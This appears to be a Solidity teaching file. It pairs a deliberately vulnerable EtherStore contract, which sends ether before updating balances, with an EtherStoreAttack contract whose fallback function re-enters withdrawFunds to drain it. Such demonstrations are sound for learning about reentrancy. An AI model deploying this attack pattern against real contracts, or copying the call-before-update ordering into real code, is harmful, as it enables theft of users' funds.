pragma solidity 0.5.6;

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    constructor() public payable{}

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw, "balance is too small");
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit, "_weiToWithdraw <= withdrawalLimit");
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks, "withdraw too early");
        (bool success, ) = msg.sender.call.value(_weiToWithdraw)("");
        require(success, "not success");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }

 contract EtherStoreAttack {
     EtherStore public victim;
     uint public counter = 0;

     constructor(EtherStore _victim) public {
         victim = _victim;
     }

    function () external payable {
        if (address(victim).balance >= 1 ether)
            victim.withdrawFunds(1 ether);
    }

    function attack() external payable {
        victim.depositFunds.value(1 ether)();
        victim.withdrawFunds(1 ether);
    }
 }